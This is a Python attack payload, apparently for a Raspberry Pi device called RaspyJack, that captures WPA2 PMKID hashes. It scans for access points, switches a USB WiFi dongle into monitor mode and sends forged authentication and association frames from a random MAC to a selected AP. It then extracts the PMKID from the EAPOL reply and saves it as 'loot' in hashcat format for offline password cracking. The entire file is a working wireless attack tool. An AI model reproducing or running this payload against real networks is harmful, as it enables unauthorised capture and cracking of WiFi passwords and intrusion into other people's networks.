#!/usr/bin/env python3
"""
RaspyJack Payload -- PMKID Hash Grabber
========================================
Author: 7h30th3r0n3

Captures PMKID hashes from WPA2 access points by sending association
requests and extracting the PMKID from EAPOL RSN PMKID-List.
Saves in hashcat-compatible format.

Setup / Prerequisites
---------------------
- USB WiFi dongle with monitor mode support (e.g. Alfa AWUS036ACH)
- pip install scapy (or apt install python3-scapy)
- apt install aircrack-ng

Controls:
  OK         -- Select AP from list
  UP / DOWN  -- Scroll AP list
  KEY1       -- Scan for APs
  KEY2       -- Export hash to loot
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/PMKID/pmkid_YYYYMMDD_HHMMSS.txt
"""

import os
import sys
import time
import struct
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11Auth, Dot11AssoReq,
        Dot11AssoResp, RadioTap, EAPOL, sendp, sniff as scapy_sniff,
        conf, get_if_hwaddr, raw, Packet,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
ROWS_VISIBLE = 6
ROW_H = 12
LOOT_DIR = "/root/Raspyjack/loot/PMKID"
CHANNELS_24 = list(range(1, 14))

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
ap_list = []          # [{bssid, essid, channel, signal}]
captured = []         # [{pmkid, ap_mac, sta_mac, essid}]
scroll = 0
selected_idx = 0
phase = "idle"        # idle | scanning | selecting | capturing | done
status_msg = ""
mon_iface = None
_running = True


# ---------------------------------------------------------------------------
# Onboard WiFi detection
# ---------------------------------------------------------------------------

def _is_onboard_wifi_iface(iface):
    """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver"))
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _find_usb_wifi():
    """Find a USB WiFi dongle suitable for monitor mode."""
    candidates = []
    try:
        for name in os.listdir("/sys/class/net"):
            if name == "lo":
                continue
            if os.path.isdir(f"/sys/class/net/{name}/wireless"):
                if not _is_onboard_wifi_iface(name):
                    candidates.append(name)
    except Exception:
        pass
    no_mon = {"brcmfmac", "b43", "wl"}
    good, fallback = [], []
    for iface in candidates:
        drv = ""
        try:
            drv = os.path.basename(
                os.path.realpath(f"/sys/class/net/{iface}/device/driver"))
        except Exception:
            pass
        (fallback if drv in no_mon else good).append(iface)
    return (good or fallback or [None])[0]


def _monitor_up(iface):
    """Put iface into monitor mode. Returns monitor interface name or None."""
    for cmd in [
        ["nmcli", "device", "set", iface, "managed", "no"],
        ["sudo", "pkill", "-f", f"wpa_supplicant.*{iface}"],
        ["sudo", "pkill", "-f", f"dhcpcd.*{iface}"],
    ]:
        try:
            subprocess.run(cmd, capture_output=True, timeout=5)
        except Exception:
            pass
    time.sleep(0.5)
    try:
        subprocess.run(["sudo", "airmon-ng", "start", iface],
                       capture_output=True, timeout=30)
        for name in (f"{iface}mon", iface):
            r = subprocess.run(["iwconfig", name],
                               capture_output=True, text=True, timeout=5)
            if "Mode:Monitor" in r.stdout:
                return name
    except Exception:
        pass
    try:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                       check=True, timeout=10)
        subprocess.run(["sudo", "iw", iface, "set", "monitor", "none"],
                       check=True, timeout=10)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                       check=True, timeout=10)
        time.sleep(0.5)
        r = subprocess.run(["iwconfig", iface],
                           capture_output=True, text=True, timeout=5)
        if "Mode:Monitor" in r.stdout:
            return iface
    except Exception:
        pass
    return None


def _monitor_down(iface):
    """Restore interface to managed mode."""
    if not iface:
        return
    base = iface.replace("mon", "")
    try:
        subprocess.run(["sudo", "airmon-ng", "stop", iface],
                       capture_output=True, timeout=10)
    except Exception:
        pass
    for cmd in [
        ["sudo", "ip", "link", "set", base, "down"],
        ["sudo", "iw", base, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", base, "up"],
        ["nmcli", "device", "set", base, "managed", "yes"],
    ]:
        try:
            subprocess.run(cmd, capture_output=True, timeout=5)
        except Exception:
            pass


def _set_channel(iface, ch):
    """Set monitor interface to a specific channel."""
    try:
        subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
                       capture_output=True, timeout=5)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Scan thread
# ---------------------------------------------------------------------------

def _scan_thread(iface):
    """Scan all 2.4 GHz channels for APs."""
    global phase, status_msg
    found = {}

    def _handle_beacon(pkt):
        if not _running:
            return
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            if not bssid:
                return
            bssid = bssid.upper()
            try:
                essid = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
            except Exception:
                essid = "<hidden>"
            if not essid:
                essid = "<hidden>"
            sig = getattr(pkt, "dBm_AntSignal", -99)
            if bssid not in found:
                found[bssid] = {"bssid": bssid, "essid": essid,
                                "channel": 0, "signal": sig}

    for ch in CHANNELS_24:
        if not _running:
            break
        _set_channel(iface, ch)
        with lock:
            status_msg = f"Scanning ch {ch}/13..."
        try:
            scapy_sniff(iface=iface, prn=_handle_beacon, timeout=1.5,
                        store=False)
        except Exception:
            pass
        for entry in found.values():
            if entry["channel"] == 0:
                entry["channel"] = ch

    with lock:
        ap_list.clear()
        ap_list.extend(sorted(found.values(), key=lambda a: a.get("signal", -99),
                              reverse=True))
        phase = "selecting" if ap_list else "idle"
        status_msg = f"Found {len(ap_list)} APs" if ap_list else "No APs found"


# ---------------------------------------------------------------------------
# PMKID capture thread
# ---------------------------------------------------------------------------

def _extract_pmkid(pkt_bytes):
    """Extract PMKID from raw EAPOL frame bytes if present."""
    # PMKID sits in RSN PMKID-List of EAPOL message 1
    # Look for RSN IE (tag 0x30) in the key data
    idx = pkt_bytes.find(b"\x30")
    while idx >= 0 and idx < len(pkt_bytes) - 30:
        # Check for PMKID KDE: OUI 00-0F-AC, type 4
        kde_marker = b"\x00\x0f\xac\x04"
        kde_pos = pkt_bytes.find(kde_marker, idx)
        if kde_pos >= 0 and kde_pos + 4 + 16 <= len(pkt_bytes):
            pmkid = pkt_bytes[kde_pos + 4: kde_pos + 4 + 16]
            if pmkid != b"\x00" * 16:
                return pmkid.hex()
        idx = pkt_bytes.find(b"\x30", idx + 1)
    return None


def _capture_thread(iface, target_ap):
    """Send association request and capture PMKID from EAPOL response."""
    global phase, status_msg
    bssid = target_ap["bssid"]
    essid = target_ap["essid"]
    channel = target_ap["channel"]

    _set_channel(iface, channel)

    # Generate a random station MAC
    import random
    sta_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5))

    pmkid_found = None

    def _handle_eapol(pkt):
        nonlocal pmkid_found
        if pmkid_found or not _running:
            return
        if pkt.haslayer(EAPOL):
            pkt_raw = raw(pkt)
            result = _extract_pmkid(pkt_raw)
            if result:
                pmkid_found = result

    # Start sniffing in background
    stop_event = threading.Event()

    def _sniff_worker():
        try:
            scapy_sniff(iface=iface, prn=_handle_eapol, timeout=15,
                        store=False,
                        lfilter=lambda p: p.haslayer(EAPOL),
                        stop_filter=lambda _: stop_event.is_set() or not _running)
        except Exception:
            pass

    sniff_t = threading.Thread(target=_sniff_worker, daemon=True)
    sniff_t.start()
    time.sleep(0.5)

    with lock:
        status_msg = f"Auth to {essid[:12]}..."

    # Send authentication frame
    auth_pkt = (RadioTap()
                / Dot11(addr1=bssid, addr2=sta_mac, addr3=bssid, type=0, subtype=11)
                / Dot11Auth(algo=0, seqnum=1, status=0))
    try:
        sendp(auth_pkt, iface=iface, count=3, inter=0.1, verbose=False)
    except Exception:
        pass
    time.sleep(1)

    with lock:
        status_msg = f"Assoc to {essid[:12]}..."

    # Send association request
    ssid_elt = Dot11Elt(ID=0, info=essid.encode())
    rates_elt = Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
    rsn_elt = Dot11Elt(
        ID=48,
        info=(b"\x01\x00"               # RSN version
              b"\x00\x0f\xac\x04"       # group cipher: CCMP
              b"\x01\x00\x00\x0f\xac\x04"  # pairwise: CCMP
              b"\x01\x00\x00\x0f\xac\x02"  # AKM: PSK
              b"\x00\x00"),
    )
    assoc_pkt = (RadioTap()
                 / Dot11(addr1=bssid, addr2=sta_mac, addr3=bssid,
                         type=0, subtype=0)
                 / Dot11AssoReq(cap=0x1104, listen_interval=3)
                 / ssid_elt / rates_elt / rsn_elt)
    try:
        sendp(assoc_pkt, iface=iface, count=5, inter=0.2, verbose=False)
    except Exception:
        pass

    with lock:
        status_msg = "Waiting for PMKID..."

    # Wait for capture
    deadline = time.time() + 12
    while time.time() < deadline and _running and not pmkid_found:
        time.sleep(0.3)

    stop_event.set()
    sniff_t.join(timeout=3)

    if pmkid_found:
        ap_clean = bssid.replace(":", "").lower()
        sta_clean = sta_mac.replace(":", "").lower()
        essid_hex = essid.encode().hex()
        entry = {
            "pmkid": pmkid_found,
            "ap_mac": ap_clean,
            "sta_mac": sta_clean,
            "essid": essid,
            "essid_hex": essid_hex,
            "hashline": f"{pmkid_found}*{ap_clean}*{sta_clean}*{essid_hex}",
        }
        with lock:
            captured.append(entry)
            status_msg = "PMKID captured!"
            phase = "done"
    else:
        with lock:
            status_msg = "No PMKID obtained"
            phase = "selecting"


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_loot():
    """Write captured PMKID hashes in hashcat format."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"pmkid_{ts}.txt")
    with lock:
        lines = [e["hashline"] for e in captured]
    with open(filepath, "w") as fh:
        fh.write("\n".join(lines) + "\n")
    return os.path.basename(filepath)


# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def _draw_frame(lcd, font):
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "PMKID GRABBER", font=font, fill="#FF6600")
    active = phase in ("scanning", "capturing")
    d.ellipse((118, 3, 122, 7), fill="#00FF00" if active else "#444")

    with lock:
        msg = status_msg
        aps = list(ap_list)
        caps = list(captured)
        cur_phase = phase

    d.text((2, 16), msg[:24], font=font, fill="#AAAAAA")

    if cur_phase in ("selecting", "done"):
        # Show AP list
        d.text((2, 28), f"APs:{len(aps)} Cap:{len(caps)}", font=font, fill="#888")
        visible = aps[scroll:scroll + ROWS_VISIBLE]
        for i, ap in enumerate(visible):
            y = 40 + i * ROW_H
            idx = scroll + i
            prefix = ">" if idx == selected_idx else " "
            line = f"{prefix}{ap['essid'][:14]}"
            color = "#00FF00" if idx == selected_idx else "#CCCCCC"
            d.text((2, y), line, font=font, fill=color)
            d.text((100, y), f"ch{ap['channel']}", font=font, fill="#666")
    elif cur_phase == "capturing":
        d.text((2, 50), "Capturing...", font=font, fill="#FFAA00")
        d.text((2, 65), "Please wait", font=font, fill="#888")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if cur_phase == "selecting":
        d.text((2, 117), "OK:Sel K1:Scan K3:Quit", font=font, fill="#888")
    elif cur_phase == "done":
        d.text((2, 117), "K2:Export K1:Scan K3:Q", font=font, fill="#888")
    else:
        d.text((2, 117), "K1:Scan K3:Exit", font=font, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running, phase, scroll, selected_idx, status_msg, mon_iface

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font()

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    usb_iface = _find_usb_wifi()
    if not usb_iface:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "No USB WiFi dongle", font=font, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    mon_iface = _monitor_up(usb_iface)
    if not mon_iface:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "Monitor mode fail", font=font, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    status_msg = "Ready. KEY1 to scan."

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "KEY1" and phase not in ("scanning", "capturing"):
                phase = "scanning"
                scroll = 0
                selected_idx = 0
                threading.Thread(target=_scan_thread, args=(mon_iface,),
                                 daemon=True).start()
                time.sleep(0.3)

            elif btn == "OK" and phase == "selecting":
                with lock:
                    if 0 <= selected_idx < len(ap_list):
                        target = dict(ap_list[selected_idx])
                if target:
                    phase = "capturing"
                    threading.Thread(target=_capture_thread,
                                     args=(mon_iface, target),
                                     daemon=True).start()
                time.sleep(0.3)

            elif btn == "KEY2":
                with lock:
                    has_data = len(captured) > 0
                if has_data:
                    fname = _export_loot()
                    with lock:
                        status_msg = f"Saved: {fname[:20]}"
                else:
                    with lock:
                        status_msg = "No hashes to export"
                time.sleep(0.3)

            elif btn == "UP":
                selected_idx = max(0, selected_idx - 1)
                with lock:
                    total = len(ap_list)
                if selected_idx < scroll:
                    scroll = selected_idx
                time.sleep(0.15)

            elif btn == "DOWN":
                with lock:
                    total = len(ap_list)
                selected_idx = min(selected_idx + 1, max(0, total - 1))
                if selected_idx >= scroll + ROWS_VISIBLE:
                    scroll = selected_idx - ROWS_VISIBLE + 1
                time.sleep(0.15)

            _draw_frame(lcd, font)
            time.sleep(0.05)

    finally:
        _running = False
        _monitor_down(mon_iface)
        time.sleep(0.3)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
